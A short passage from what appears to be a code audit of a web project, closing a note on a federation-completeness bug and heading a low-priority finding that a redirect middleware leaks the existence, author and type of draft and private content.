deveco.io is 3, on `netburner`; seeed-studio/openmv/solidrun/brainchip are all 0). It is a definite latent federation-completeness bug with a one-line fix, not an active outage.

</details>

#### [P3] content-redirect 301s on draft and private content, leaking existence, author and true type

`layers/base/server/middleware/content-redirect.ts:43`
